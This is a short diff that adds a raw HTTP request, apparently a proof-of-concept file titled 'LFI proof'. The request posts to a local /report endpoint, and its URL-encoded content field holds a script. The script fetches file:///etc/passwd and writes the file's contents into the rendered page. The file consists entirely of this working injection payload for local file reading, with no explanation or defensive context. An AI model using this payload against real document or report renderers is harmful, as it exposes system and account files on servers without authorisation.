@@ -1,0 +1,7 @@
+POST /report HTTP/1.1
+Host: 127.0.0.1:8000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 240
+Connection: close
+
+content=%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest%28%29%3Bx.open%28%22GET%22%2C%22file%3A///etc/passwd%22%2Cfalse%29%3Bx.send%28%29%3Bdocument.write%28%22%3Cpre%3E%22%2Bx.responseText%2B%22%3C/pre%3E%22%29%3B%3C/script%3E&title=LFI%20proof
